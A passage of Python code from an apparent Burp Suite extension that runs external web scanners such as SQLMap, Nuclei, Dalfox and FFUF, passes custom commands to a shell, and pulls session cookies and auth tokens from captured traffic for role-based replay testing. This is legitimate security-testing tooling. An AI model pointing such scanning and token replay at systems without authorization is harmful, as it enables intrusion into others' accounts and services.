        import subprocess
        import tempfile
        import threading
        import time as time_module

        # Helper to identify tool for logging
        tool_name = cmd[0].split("/")[-1] if "/" in cmd[0] else cmd[0]

        def run_thread():
            try:
                cmd_str = " ".join(cmd)
                # Update UI immediately
                SwingUtilities.invokeLater(
                    lambda: output_area.append("[*] Command: {}\n\n".format(cmd_str))
                )
                self.log_to_ui("[*] Running: {}".format(tool_name))

                capture_fd = None
                capture_path = None
                capture_handle = None
                process = None

                try:
                    capture_fd, capture_path = tempfile.mkstemp(
                        prefix="burp_tool_async_", suffix=".log"
                    )
                    os.close(capture_fd)
                    capture_fd = None
                    capture_handle = open(capture_path, "wb")
                    # File-backed capture avoids PIPE deadlocks on noisy tools.
                    process = subprocess.Popen(
                        cmd,
                        stdout=capture_handle,
                        stderr=subprocess.STDOUT,
                        shell=False,
                    )
                finally:
                    if capture_handle:
                        try:
                            capture_handle.close()
                        except Exception as close_err:
                            self._callbacks.printError(
                                "{} capture close error: {}".format(
                                    tool_name, str(close_err)
                                )
                            )

                start_time = time_module.time()
                timeout = 600  # 10 minutes
                result_count = 0
                last_read_offset = 0

                SwingUtilities.invokeLater(
                    lambda: output_area.append("[*] Stage: Running...\n")
                )

                def pump_capture():
                    """Read newly-written capture bytes and append to UI."""
                    if not capture_path or (not os.path.exists(capture_path)):
                        return 0
                    try:
                        with open(capture_path, "rb") as reader:
                            reader.seek(last_read_offset)
                            chunk = reader.read()
                    except Exception as read_err:
                        self._callbacks.printError(
                            "{} capture read error: {}".format(
                                tool_name, str(read_err)
                            )
                        )
                        return 0

                    if not chunk:
                        return 0

                    decoded = self._decode_process_data(
                        chunk, "{} stdout chunk".format(tool_name)
                    )
                    if not decoded:
                        return 0

                    clean_text = self.ANSI_ESCAPE_PATTERN.sub("", decoded)
                    non_empty_lines = [
                        line for line in clean_text.splitlines() if line.strip()
                    ]
                    if non_empty_lines:
                        SwingUtilities.invokeLater(
                            lambda t=clean_text: output_area.append(t)
                        )
                    return len(chunk), len(non_empty_lines)

                def cleanup_capture_file():
                    if capture_path and os.path.exists(capture_path):
                        try:
                            os.remove(capture_path)
                        except Exception as cleanup_err:
                            self._callbacks.printError(
                                "{} capture cleanup error: {}".format(
                                    tool_name, str(cleanup_err)
                                )
                            )

                # Non-blocking monitor loop (no readline on pipes).
                while process.poll() is None:
                    elapsed = int(time_module.time() - start_time)
                    if elapsed > timeout:
                        try:
                            process.kill()
                            process.wait()
                        except Exception as e:
                            self._callbacks.printError(
                                "Process kill failed: {}".format(str(e))
                            )
                        SwingUtilities.invokeLater(
                            lambda: output_area.append(
                                "\n[!] Timeout after {}s\n".format(timeout)
                            )
                        )
                        cleanup_capture_file()
                        return

                    pumped = pump_capture()
                    if pumped:
                        bytes_read, lines_read = pumped
                        last_read_offset += bytes_read
                        result_count += lines_read
                    time_module.sleep(0.2)

                process.wait()
                pumped = pump_capture()
                if pumped:
                    bytes_read, lines_read = pumped
                    last_read_offset += bytes_read
                    result_count += lines_read

                total_time = int(time_module.time() - start_time)

                if result_count == 0:
                    SwingUtilities.invokeLater(
                        lambda: output_area.append(
                            "\n[!] Complete: {}s | No results (target may be slow/unreachable)\n".format(
                                total_time
                            )
                        )
                    )
                    self.log_to_ui(
                        "[!] {}: {}s, no results".format(tool_name, total_time)
                    )
                else:
                    SwingUtilities.invokeLater(
                        lambda: output_area.append(
                            "\n[+] Complete: {}s | {} results\n".format(
                                total_time, result_count
                            )
                        )
                    )
                    self.log_to_ui(
                        "[+] {}: {}s, {} results".format(
                            tool_name, total_time, result_count
                        )
                    )

                # Trigger result processor (file reading)
                if result_processor:
                    SwingUtilities.invokeLater(result_processor)

                cleanup_capture_file()

            except Exception as e:
                err_msg = str(e)
                SwingUtilities.invokeLater(
                    lambda: output_area.append(
                        "\n[!] Critical Error: {}\n".format(err_msg)
                    )
                )
                self.log_to_ui("[!] {} error: {}".format(tool_name, err_msg))
                print(err_msg)  # Print to Burp console for debugging
                try:
                    if capture_path and os.path.exists(capture_path):
                        os.remove(capture_path)
                except Exception as cleanup_err:
                    self._callbacks.printError(
                        "{} capture cleanup error: {}".format(
                            tool_name, str(cleanup_err)
                        )
                    )

        # Start the thread
        t = threading.Thread(target=run_thread)
        t.daemon = True
        t.start()

    def _process_file_results(self, output_file, output_area):
        """
        Generic helper to read output files and display them in the UI.
        """
        import os

        try:
            if not os.path.exists(output_file):
                output_area.append(
                    "\n[!] Expected output file not found: {}\n".format(output_file)
                )
                return

            with open(output_file, "r") as f:
                lines = [l.strip() for l in f.readlines() if l.strip()]

            count = len(lines)

            summary = "\n" + "=" * 60 + "\n"
            summary += " RESULT SUMMARY\n"
            summary += "=" * 60 + "\n"
            summary += "[+] File: {}\n".format(output_file)
            summary += "[+] Total Results Found: {}\n".format(count)

            if count > 0:
                summary += "\n--- First 20 Results ---\n"
                summary += "\n".join(lines[:20])
                if count > 20:
                    summary += "\n... ({} more results in file)".format(count - 20)
            else:
                summary += "\n[!] No results found in output file.\n"

            summary += "\n" + "=" * 60 + "\n"
            output_area.append(summary)

        except Exception as e:
            output_area.append(
                "\n[!] Error processing results file: {}\n".format(str(e))
            )

    def _export_httpx_urls(self):
        """Export URLs for HTTPX probing - only saves when user clicks Export"""
        if not self.api_data:
            self.httpx_area.setText("[!] No endpoints to export\n")
            return
        export_dir = self._get_export_dir("HTTPX_Export")
        if not export_dir:
            return
        try:
            filepath = self._export_urls_to_file(export_dir, "urls.txt")
            self.httpx_area.setText(
                "[+] Exported {} URLs\n[+] File: {}\n[+] Folder: {}\n".format(
                    len(self.api_data), filepath, export_dir
                )
            )
            self.log_to_ui("[+] Exported HTTPX URLs to: {}".format(export_dir))
        except Exception as e:
            self.httpx_area.append("[!] Export failed: {}\n".format(str(e)))

    def _clean_url(self, url):
        r"""Remove \n\t and other unwanted characters from URL"""
        return re.sub(r"[\n\t\r]", "", url.strip())

    def _cleanup_temp_dir(self, temp_dir, context):
        """Delete temporary directory and report cleanup failures explicitly."""
        import os
        import shutil

        if not temp_dir:
            return
        if not os.path.exists(temp_dir):
            return

        try:
            shutil.rmtree(temp_dir)
        except Exception as e:
            self._callbacks.printError(
                "Cleanup error ({}): {}".format(context, str(e))
            )

    def _resolve_custom_command(self, tool_name, checkbox, field, context, output_area):
        """Resolve command template when custom command override is enabled."""
        import os

        use_custom = checkbox.isSelected()
        if not use_custom:
            return False, None

        template = field.getText().strip()
        if not template:
            output_area.setText(
                "[!] {} custom command enabled but empty\n".format(tool_name)
            )
            output_area.append(
                "[*] Uncheck 'Enable Custom' or provide a command\n"
            )
            return True, None

        try:
            rendered_command = template.format(**context).strip()
        except KeyError as e:
            placeholder = str(e).strip("'\"")
            output_area.setText(
                "[!] {} custom command has unknown placeholder: {{{}}}\n".format(
                    tool_name, placeholder
                )
            )
            output_area.append(
                "[*] Supported placeholders: {}\n".format(
                    ", ".join(sorted(context.keys()))
                )
            )
            return True, None
        except Exception as e:
            output_area.setText(
                "[!] {} custom command template error: {}\n".format(tool_name, str(e))
            )
            return True, None

        if not rendered_command:
            output_area.setText(
                "[!] {} custom command became empty after formatting\n".format(tool_name)
            )
            return True, None

        try:
            shlex.split(rendered_command, posix=(os.name != "nt"))
        except Exception as e:
            output_area.setText(
                "[!] {} custom command is invalid: {}\n".format(tool_name, str(e))
            )
            return True, None

        return True, rendered_command

    def _build_shell_command(self, command_text):
        """Build OS-aware shell command wrapper for custom command execution."""
        import os

        if os.name == "nt":
            return ["cmd", "/c", command_text]

        if os.path.exists("/bin/bash"):
            return ["/bin/bash", "-lc", command_text]
        if os.path.exists("/bin/sh"):
            return ["/bin/sh", "-lc", command_text]
        return ["sh", "-lc", command_text]

    def _decode_process_data(self, data, context):
        """Decode subprocess output safely for Jython/Python compatibility."""
        if isinstance(data, str):
            return data
        try:
            return data.decode("utf-8", errors="ignore")
        except Exception as e:
            self._callbacks.printError("{} decode error: {}".format(context, str(e)))
            return str(data)

    def _safe_pipe_read(self, pipe, context):
        """Read subprocess pipe safely and decode, tolerating already-closed streams."""
        if not pipe:
            return ""
        try:
            data = pipe.read()
        except (IOError, OSError, ValueError) as e:
            self._callbacks.printError("{} read error: {}".format(context, str(e)))
            return ""
        return self._decode_process_data(data, context)

    def _ascii_safe(self, value, lower=False, max_len=None):
        """Return ASCII-safe text to prevent Unicode encode errors under Jython/Python2."""
        if value is None:
            text = ""
        else:
            text = value
        try:
            text_type = unicode  # noqa: F821 (Python2/Jython)
            if isinstance(text, text_type):
                normalized = text
            elif isinstance(text, str):
                try:
                    normalized = text.decode("utf-8", errors="replace")
                except (AttributeError, TypeError, ValueError, UnicodeDecodeError):
                    normalized = text_type(text)
            else:
                normalized = text_type(text)
            safe = normalized.encode("ascii", "backslashreplace")
        except NameError:
            # Python 3 path
            if isinstance(text, bytes):
                normalized = text.decode("utf-8", errors="replace")
            else:
                normalized = str(text)
            safe = normalized.encode("ascii", "backslashreplace").decode("ascii")
        except (TypeError, ValueError, UnicodeError):
            try:
                safe = repr(text)
            except (TypeError, ValueError):
                safe = "<unprintable>"

        if lower:
            safe = safe.lower()
        if max_len is not None and len(safe) > max_len:
            safe = safe[:max_len]
        return safe

    def _probe_binary_help(self, binary_path):
        """Run lightweight binary help probes and cache result per path."""
        cache_key = "help::{}".format(binary_path)
        if cache_key in self._tool_help_cache:
            return self._tool_help_cache[cache_key]

        import os
        import subprocess
        import tempfile
        import time as time_module

        best_output = ""
        last_error = None

        for help_flag in ["-h", "--help"]:
            cmd = [binary_path, help_flag]
            capture_path = None
            capture_handle = None
            process = None
            timed_out = False
            try:
                fd, capture_path = tempfile.mkstemp(
                    prefix="burp_help_probe_", suffix=".log"
                )
                os.close(fd)
                capture_handle = open(capture_path, "wb")
                process = subprocess.Popen(
                    cmd,
                    stdout=capture_handle,
                    stderr=subprocess.STDOUT,
                    shell=False,
                )
            except Exception as e:
                last_error = str(e)
                if capture_handle:
                    try:
                        capture_handle.close()
                    except Exception as close_err:
                        self._callbacks.printError(
                            "Help probe file close error ({}): {}".format(
                                binary_path, str(close_err)
                            )
                        )
                if capture_path:
                    try:
                        os.remove(capture_path)
                    except Exception as rm_err:
                        self._callbacks.printError(
                            "Help probe file cleanup error ({}): {}".format(
                                binary_path, str(rm_err)
                            )
                        )
                continue

            timeout_seconds = 8
            started = time_module.time()
            while process.poll() is None:
                if time_module.time() - started > timeout_seconds:
                    try:
                        process.kill()
                        process.wait()
                    except Exception as kill_err:
                        self._callbacks.printError(
                            "Help probe kill error ({}): {}".format(
                                binary_path, str(kill_err)
                            )
                        )
                    last_error = "timed out after {}s".format(timeout_seconds)
                    timed_out = True
                    break
                time_module.sleep(0.1)

            if capture_handle:
                try:
                    capture_handle.close()
                except Exception as close_err:
                    self._callbacks.printError(
                        "Help probe file close error ({}): {}".format(
                            binary_path, str(close_err)
                        )
                    )

            combined = ""
            if capture_path:
                try:
                    with open(capture_path, "rb") as reader:
                        combined_data = reader.read()
                    combined = self._decode_process_data(
                        combined_data, "Help probe output ({})".format(binary_path)
                    ).strip()
                except Exception as read_err:
                    self._callbacks.printError(
                        "Help probe read error ({}): {}".format(
                            binary_path, str(read_err)
                        )
                    )
                finally:
                    try:
                        os.remove(capture_path)
                    except Exception as rm_err:
                        self._callbacks.printError(
                            "Help probe file cleanup error ({}): {}".format(
                                binary_path, str(rm_err)
                            )
                        )

            if combined and len(combined) > len(best_output):
                best_output = combined

            help_markers = combined.lower()
            has_help_text = (
                "usage" in help_markers
                or "flags:" in help_markers
                or "options" in help_markers
            )
            if (not timed_out) and (process.returncode == 0 or has_help_text):
                result = (True, best_output or combined, None)
                self._tool_help_cache[cache_key] = result
                return result

            if not timed_out:
                last_error = "exit code {}".format(process.returncode)

        result = (False, best_output, last_error or "unable to execute command")
        self._tool_help_cache[cache_key] = result
        return result

    def _validate_binary_signature(
        self,
        tool_name,
        binary_path,
        output_area,
        required_tokens=None,
        forbidden_tokens=None,
        fix_hint=None,
    ):
        """Validate local external binary signature/options before running scans."""
        required_tokens = required_tokens or []
        forbidden_tokens = forbidden_tokens or []

        probe_ok, help_text, probe_error = self._probe_binary_help(binary_path)
        if not probe_ok:
            output_area.setText(
                "[!] {} binary check failed: {}\n".format(tool_name, binary_path)
            )
            if probe_error:
                output_area.append("[!] {}\n".format(probe_error))
            if help_text:
                first_line = help_text.splitlines()[0] if help_text.splitlines() else ""
                if first_line:
                    output_area.append("[!] Output: {}\n".format(first_line[:200]))
            if fix_hint:
                output_area.append("[*] {}\n".format(fix_hint))
            return False

        help_text_lower = (help_text or "").lower()
        missing = [
            token for token in required_tokens if token.lower() not in help_text_lower
        ]
        forbidden = [
            token for token in forbidden_tokens if token.lower() in help_text_lower
        ]

        if missing or forbidden:
            output_area.setText(
                "[!] {} binary appears incompatible: {}\n".format(
                    tool_name, binary_path
                )
            )
            if forbidden:
                output_area.append(
                    "[!] Detected incompatible signature: {}\n".format(
                        ", ".join(forbidden)
                    )
                )
            if missing:
                output_area.append(
                    "[!] Missing expected options: {}\n".format(", ".join(missing))
                )
            if fix_hint:
                output_area.append("[*] {}\n".format(fix_hint))
            return False

        return True

    def _tool_health_specs(self):
        """Return tool-health probe specifications for one-click diagnostics."""
        import os

        return [
            {
                "name": "Nuclei",
                "field": "nuclei_path_field",
                "fallback": [
                    os.path.expanduser("~/go/bin/nuclei"),
                    "nuclei",
                ],
                "required": ["-list", "-tags", "-etags", "-jsonl"],
                "forbidden": [],
            },
            {
                "name": "HTTPX",
                "field": "httpx_path_field",
                "fallback": [
                    os.path.expanduser("~/go/bin/httpx"),
                    "httpx",
                ],
                "required": ["-status-code", "-title"],
                "forbidden": [
                    "a next generation http client",
                    "usage: httpx <url> [options]",
                ],
            },
            {
                "name": "Katana",
                "field": "katana_path_field",
                "fallback": [
                    os.path.expanduser("~/go/bin/katana"),
                    "katana",
                ],
                "required": ["-list", "-d"],
                "forbidden": [],
            },
            {
                "name": "FFUF",
                "field": "ffuf_path_field",
                "fallback": [
                    os.path.expanduser("~/go/bin/ffuf"),
                    "ffuf",
                ],
                "required": ["-u", "-w"],
                "forbidden": [],
            },
            {
                "name": "SQLMap",
                "field": "sqlmap_path_field",
                "fallback": [
                    os.path.expanduser("~/.local/bin/sqlmap"),
                    "sqlmap",
                ],
                "required": ["-u", "--batch", "--level"],
                "forbidden": [],
            },
            {
                "name": "Dalfox",
                "field": "dalfox_path_field",
                "fallback": [
                    os.path.expanduser("~/go/bin/dalfox"),
                    "dalfox",
                ],
                "required": ["url", "--format", "-o"],
                "forbidden": [],
            },
            {
                "name": "Subfinder",
                "field": "asset_subfinder_path_field",
                "fallback": [
                    os.path.expanduser("~/go/bin/subfinder"),
                    "subfinder",
                ],
                "required": ["-d", "-silent"],
                "forbidden": [],
            },
        ]

    def _resolve_tool_health_path(self, spec):
        """Resolve probe path from UI field first, then fallback candidates."""
        field_name = spec.get("field")
        if field_name and hasattr(self, field_name):
            try:
                field_obj = getattr(self, field_name)
                value = self._ascii_safe(field_obj.getText()).strip()
                if value:
                    return value
            except Exception as e:
                self._callbacks.printError(
                    "Tool health field read error ({}): {}".format(
                        spec.get("name", "unknown"), str(e)
                    )
                )

        for candidate in (spec.get("fallback") or []):
            safe_candidate = self._ascii_safe(candidate).strip()
            if safe_candidate:
                return safe_candidate
        return ""

    def _run_tool_health_check(self, event):
        """Run one-click health diagnostics for external tools."""
        self.log_to_ui("[*] Running Tool Health diagnostics...")

        def run_health():
            lines = []
            lines.append("=" * 80)
            lines.append("TOOL HEALTH CHECK")
            lines.append("=" * 80)
            lines.append(
                "[*] Timestamp: {}".format(
                    SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Date())
                )
            )
            lines.append("")

            total = 0
            healthy = 0
            for spec in self._tool_health_specs():
                total += 1
                name = self._ascii_safe(spec.get("name") or "Unknown")
                path = self._resolve_tool_health_path(spec)
                lines.append("[*] {} | path={}".format(name, path or "<empty>"))
                if not path:
                    lines.append("  [FAIL] missing path")
                    continue

                probe_ok, help_text, probe_error = self._probe_binary_help(path)
                if not probe_ok:
                    error_msg = self._ascii_safe(probe_error or "probe failed")
                    lines.append("  [FAIL] {}".format(error_msg))
                    continue

                check = self._evaluate_help_text(
                    help_text or "",
                    required_tokens=spec.get("required"),
                    forbidden_tokens=spec.get("forbidden"),
                )
                if check.get("healthy"):
                    healthy += 1
                    lines.append("  [PASS] compatible")
                else:
                    missing = check.get("missing") or []
                    forbidden = check.get("forbidden_found") or []
                    if missing:
                        lines.append("  [FAIL] missing options: {}".format(", ".join(missing)))
                    if forbidden:
                        lines.append(
                            "  [FAIL] incompatible signature: {}".format(
                                ", ".join(forbidden)
                            )
                        )

            lines.append("")
            lines.append("[*] Healthy: {}/{}".format(healthy, total))
            lines.append("=" * 80)
            report = "\n".join(lines)

            SwingUtilities.invokeLater(lambda r=report: self.log_to_ui(r))

            def show_popup():
                text = JTextArea(report, 28, 120)
                text.setEditable(False)
                text.setLineWrap(False)
                text.setFont(Font("Monospaced", Font.PLAIN, 12))
                JOptionPane.showMessageDialog(
                    self._panel,
                    JScrollPane(text),
                    "Tool Health",
                    JOptionPane.INFORMATION_MESSAGE,
                )

            SwingUtilities.invokeLater(show_popup)

        worker = threading.Thread(target=run_health)
        worker.daemon = True
        worker.start()

    def _extract_command_executables(self, command_text):
        """Extract executable tokens from simple shell command chains."""
        import os

        executables = []
        try:
            tokens = shlex.split(command_text, posix=(os.name != "nt"))
        except Exception as e:
            self._callbacks.printError(
                "Command executable parse error: {}".format(str(e))
            )
            return executables

        separators = set(["|", "||", "&&", ";"])
        expect_exec = True
        for token in tokens:
            if token in separators:
                expect_exec = True
                continue
            if not expect_exec:
                continue
            if "=" in token and "/" not in token:
                # Skip basic env assignments like KEY=value
                parts = token.split("=", 1)
                if len(parts) == 2 and parts[0]:
                    continue
            executables.append(token)
            expect_exec = False

        return executables

    def _validate_wayback_custom_command_tools(self, command_text, output_area):
        """Validate wayback custom command tools (gau/waybackurls) when present."""
        import os

        executables = self._extract_command_executables(command_text)
        checks = {
            "waybackurls": {
                "required": ["-dates", "-no-subs"],
                "forbidden": [],
                "hint": "Install waybackurls and ensure it is in PATH, or use full path in Custom Cmd.",
            },
            "gau": {
                "required": ["--subs", "--threads"],
                "forbidden": [],
                "hint": "Install gau and ensure it is in PATH, or use full path in Custom Cmd.",
            },
        }

        for executable in executables:
            name = os.path.basename(executable)
            if name not in checks:
                continue
            cfg = checks[name]
            if not self._validate_binary_signature(
                name,
                executable,
                output_area,
                required_tokens=cfg["required"],
                forbidden_tokens=cfg["forbidden"],
                fix_hint=cfg["hint"],
            ):
                return False

        return True

    def _clear_tool_cancel(self, tool_key):
        """Clear cancellation event for a tool run."""
        event = self._tool_cancel_flags.get(tool_key)
        if event:
            event.clear()

    def _set_tool_cancel(self, tool_key):
        """Set cancellation event for a tool run."""
        event = self._tool_cancel_flags.get(tool_key)
        if event:
            event.set()

    def _is_tool_cancelled(self, tool_key):
        """Check whether user requested stop for a tool."""
        event = self._tool_cancel_flags.get(tool_key)
        return event.is_set() if event else False

    def _set_active_tool_process(self, tool_key, process_obj):
        """Track currently running subprocess for a tool."""
        with self._tool_process_lock:
            self._active_tool_processes[tool_key] = process_obj

    def _get_active_tool_process(self, tool_key):
        """Get currently running subprocess for a tool."""
        with self._tool_process_lock:
            return self._active_tool_processes.get(tool_key)

    def _clear_active_tool_process(self, tool_key, process_obj=None):
        """Clear tracked subprocess for a tool, optionally by identity."""
        with self._tool_process_lock:
            current = self._active_tool_processes.get(tool_key)
            if current is None:
                return
            if process_obj is None or current is process_obj:
                self._active_tool_processes.pop(tool_key, None)

    def _terminate_process_cross_platform(self, process_obj, tool_name):
        """Terminate process tree across Windows/macOS/Linux best-effort."""
        import os
        import subprocess
        import time as time_module

        if not process_obj:
            return True, "No running process"

        already_done = process_obj.poll() is not None
        if already_done:
            return True, "Process already finished"

        pid = getattr(process_obj, "pid", None)
        errors = []

        try:
            if pid:
                if os.name == "nt":
                    kill_cmd = ["taskkill", "/PID", str(pid), "/T", "/F"]
                    killer = subprocess.Popen(
                        kill_cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        shell=False,
                    )
                    killer.wait()
                else:
                    # Kill children first, then parent (best-effort).
                    for kill_cmd in [
                        ["pkill", "-TERM", "-P", str(pid)],
                        ["kill", "-TERM", str(pid)],
                    ]:
                        killer = subprocess.Popen(
                            kill_cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=False,
                        )
                        killer.wait()
        except Exception as e:
            errors.append("OS-level stop error: {}".format(str(e)))

        try:
            process_obj.terminate()
        except Exception as e:
            errors.append("terminate() error: {}".format(str(e)))

        wait_start = time_module.time()
        while process_obj.poll() is None and (time_module.time() - wait_start) < 3:
            time_module.sleep(0.1)

        if process_obj.poll() is None:
            try:
                process_obj.kill()
            except Exception as e:
                errors.append("kill() error: {}".format(str(e)))

        stopped = process_obj.poll() is not None
        if stopped:
            return True, "Stopped {}".format(tool_name)

        if errors:
            return False, " | ".join(errors)
        return False, "Process still running"

    def _stop_tool_run(self, tool_key, tool_name, output_area):
        """Stop active external tool run with cross-platform kill behavior."""
        self._set_tool_cancel(tool_key)

        process_obj = self._get_active_tool_process(tool_key)
        if not process_obj:
            output_area.append(
                "[*] Stop requested for {} (no active subprocess detected)\n".format(
                    tool_name
                )
            )
            self.log_to_ui("[*] Stop requested for {}".format(tool_name))
            return

        stopped, message = self._terminate_process_cross_platform(process_obj, tool_name)
        self._clear_active_tool_process(tool_key, process_obj)
        if stopped:
            output_area.append("[!] {} stop requested by user\n".format(tool_name))
            self.log_to_ui("[!] {} stopped by user".format(tool_name))
        else:
            output_area.append("[!] Failed to stop {}: {}\n".format(tool_name, message))
            self.log_to_ui("[!] {} stop failed: {}".format(tool_name, message))

    def _pkill_external_tools(self, output_area=None):
        """Emergency stop: kill all scanner tools and orphan processes by name."""
        import os
        import platform
        import subprocess

        tool_specs = [
            ("nuclei", "Nuclei"),
            ("httpx", "HTTPX"),
            ("katana", "Katana"),
            ("ffuf", "FFUF"),
            ("wayback", "Wayback"),
            ("sqlmap", "SQLMap"),
            ("dalfox", "Dalfox"),
            ("assetdiscovery", "Subfinder"),
            ("graphqlanalysis", "GraphQL"),
        ]

        lines = [
            "[!] Emergency kill requested for external tools",
            "[*] Platform: {}".format(platform.system() or os.name),
        ]

        # Stop tracked processes first.
        for tool_key, tool_name in tool_specs:
            self._set_tool_cancel(tool_key)
            process_obj = self._get_active_tool_process(tool_key)
            if not process_obj:
                continue
            stopped, message = self._terminate_process_cross_platform(process_obj, tool_name)
            self._clear_active_tool_process(tool_key, process_obj)
            if stopped:
                lines.append("[+] {}: stopped tracked process".format(tool_name))
            else:
                lines.append("[!] {}: {}".format(tool_name, message))

        # Sweep orphan processes by executable pattern.
        if os.name == "nt":
            kill_names = [
                "nuclei.exe",
                "httpx.exe",
                "katana.exe",
                "ffuf.exe",
                "waybackurls.exe",
                "gau.exe",
                "sqlmap.exe",
                "dalfox.exe",
                "subfinder.exe",
            ]
            for name in kill_names:
                try:
                    process = subprocess.Popen(
                        ["taskkill", "/IM", name, "/F", "/T"],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        shell=False,
                    )
                    process.wait()
                except Exception as e:
                    lines.append("[!] taskkill {} failed: {}".format(name, str(e)))
        else:
            kill_patterns = [
                "nuclei",
                "httpx",
                "katana",
                "ffuf",
                "waybackurls",
                "gau",
                "sqlmap",
                "dalfox",
                "subfinder",
            ]
            for pattern in kill_patterns:
                try:
                    process = subprocess.Popen(
                        ["pkill", "-TERM", "-f", pattern],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        shell=False,
                    )
                    process.wait()
                except OSError as e:
                    # Fallback for minimal systems lacking pkill.
                    try:
                        process = subprocess.Popen(
                            ["killall", "-q", pattern],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=False,
                        )
                        process.wait()
                        lines.append("[*] killall fallback used for {}".format(pattern))
                    except Exception as fallback_err:
                        lines.append(
                            "[!] pkill/killall {} failed: {} | {}".format(
                                pattern, str(e), str(fallback_err)
                            )
                        )
                except Exception as e:
                    lines.append("[!] pkill {} failed: {}".format(pattern, str(e)))

        summary = "\n".join(lines) + "\n"
        if output_area is not None:
            output_area.append(summary)
        self.log_to_ui(
            "[!] Emergency kill executed for nuclei/httpx/katana/ffuf/wayback/sqlmap/dalfox/subfinder/graphql"
        )

    def _stop_nuclei(self, event):
        self._stop_tool_run("nuclei", "Nuclei", self.nuclei_area)

    def _stop_httpx(self, event):
        self._stop_tool_run("httpx", "HTTPX", self.httpx_area)

    def _stop_katana(self, event):
        self._stop_tool_run("katana", "Katana", self.katana_area)

    def _stop_ffuf(self, event):
        self._stop_tool_run("ffuf", "FFUF", self.ffuf_area)

    def _stop_wayback(self, event):
        self._stop_tool_run("wayback", "Wayback", self.wayback_area)

    def _stop_sqlmap(self, event):
        self._stop_tool_run("sqlmap", "SQLMap", self.sqlmap_area)

    def _stop_dalfox(self, event):
        self._stop_tool_run("dalfox", "Dalfox", self.dalfox_area)

    def _stop_asset_discovery(self, event):
        self._stop_tool_run("assetdiscovery", "Subfinder", self.asset_area)

    def _stop_openapi_drift(self, event):
        self._set_tool_cancel("openapidrift")
        self.openapi_area.append("[!] OpenAPI drift stop requested by user\n")
        self.log_to_ui("[!] OpenAPI drift stop requested by user")

    def _stop_graphql(self, event):
        self._stop_tool_run("graphqlanalysis", "GraphQL Analysis", self.graphql_area)

    def _stop_auth_replay(self, event):
        """Request cancellation for auth replay run."""
        self._set_tool_cancel("authreplay")
        self.auth_replay_area.append("[!] Auth Replay stop requested by user\n")
        self.log_to_ui("[!] Auth Replay stop requested by user")

    def _parse_auth_profile_header(self, profile_name, header_value):
        """Parse optional role header in 'Name: Value' format."""
        raw = (header_value or "").strip()
        if not raw:
            return None
        if ":" not in raw:
            raise ValueError(
                "{} header must use 'Name: Value' format".format(profile_name)
            )
        name, value = raw.split(":", 1)
        name = name.strip()
        value = value.strip()
        if not name or not value:
            raise ValueError(
                "{} header must include both name and value".format(profile_name)
            )
        return (name, value)

    def _get_auth_profile_field(self, profile_key):
        """Return UI field for auth replay profile key."""
        mapping = {
            "guest": self.auth_guest_header_field,
            "user": self.auth_user_header_field,
            "admin": self.auth_admin_header_field,
        }
        return mapping.get(profile_key)

    def _get_selected_endpoint_key(self):
        """Get currently selected endpoint key from Recon list."""
        selected_value = self.endpoint_list.getSelectedValue()
        if selected_value is None:
            return None
        return EndpointClickListener._extract_endpoint_key(str(selected_value))

    def _entry_matches_profile_hint(self, entry, profile_key):
        """Heuristic to prefer entries that likely match chosen profile."""
        auth_detected = [str(a).lower() for a in entry.get("auth_detected", [])]
        if profile_key == "guest":
            return (
                ("none" in auth_detected)
                or ("session cookie" in auth_detected)
                or (len(auth_detected) == 0)
            )
        return "none" not in auth_detected

    def _extract_profile_header_candidates_from_headers(self, headers, profile_key):
        """Collect ordered header candidates from one request header set."""
        if not headers or not isinstance(headers, dict):
            return []

        if profile_key == "guest":
            priority = [
                "cookie",
                "authorization",
                "x-api-key",
                "x-auth-token",
                "x-access-token",
                "x-session-token",
                "x-csrf-token",
            ]
        else:
            priority = [
                "authorization",
                "x-api-key",
                "x-auth-token",
                "x-access-token",
                "cookie",
                "x-session-token",
                "x-csrf-token",
            ]

        header_items = []
        for key, value in headers.items():
            key_str = str(key).strip()
            value_str = str(value).strip()
            if key_str and value_str:
                header_items.append((key_str, value_str))

        candidates = []
        seen = set()

        for wanted in priority:
            for key, value in header_items:
                candidate = "{}: {}".format(key, value)
                candidate_key = candidate.lower()
                if key.lower() == wanted and candidate_key not in seen:
                    candidates.append(candidate)
                    seen.add(candidate_key)

        keyword_priority = ["auth", "token", "cookie", "session", "api-key", "apikey"]
        for keyword in keyword_priority:
            for key, value in header_items:
                key_lower = key.lower()
                candidate = "{}: {}".format(key, value)
                candidate_key = candidate.lower()
                if keyword in key_lower and candidate_key not in seen:
                    candidates.append(candidate)
                    seen.add(candidate_key)

        return candidates

    def _extract_profile_header_from_headers(self, headers, profile_key):
        """Pick first best candidate header from header dict for selected profile."""
        candidates = self._extract_profile_header_candidates_from_headers(
            headers, profile_key
        )
        return candidates[0] if candidates else None

    def _find_profile_header_candidates_in_entries(
        self, entries, profile_key, prefer_match=True, max_candidates=10
    ):
        """Search entries list and return ordered unique header candidates."""
        entries_list = entries if isinstance(entries, list) else [entries]
        if prefer_match:
            first_pass = [
                e
                for e in entries_list
                if isinstance(e, dict) and self._entry_matches_profile_hint(e, profile_key)
            ]
            second_pass = entries_list
        else:
            first_pass = entries_list
            second_pass = []

        results = []
        seen = set()
        for pass_entries in [first_pass, second_pass]:
            for entry in pass_entries:
                if not isinstance(entry, dict):
                    continue
                candidates = self._extract_profile_header_candidates_from_headers(
                    entry.get("headers", {}), profile_key
                )
                for header_line in candidates:
                    normalized = header_line.lower()
                    if normalized in seen:
                        continue
                    results.append(header_line)
                    seen.add(normalized)
                    if len(results) >= max_candidates:
                        return results
        return results

    def _build_auth_header_choice_label(self, index, endpoint_key, header_line, is_selected):
        """Build readable label for header extraction popup."""
        source_label = "[Selected]" if is_selected else "[Captured]"
        endpoint_label = endpoint_key or "<unknown endpoint>"
        preview = header_line
        if len(preview) > 110:
            preview = preview[:107] + "..."
        return "#{:02d} {} {} -> {}".format(
            index, source_label, endpoint_label, preview
        )

    def _choose_auth_profile_header_candidate(self, profile_key, options):
        """Show searchable popup for choosing extracted header candidate."""
        chooser_panel = JPanel(BorderLayout(6, 6))
        top_row = JPanel(FlowLayout(FlowLayout.LEFT))
        top_row.add(JLabel("Filter:"))
        search_field = JTextField("", 42)
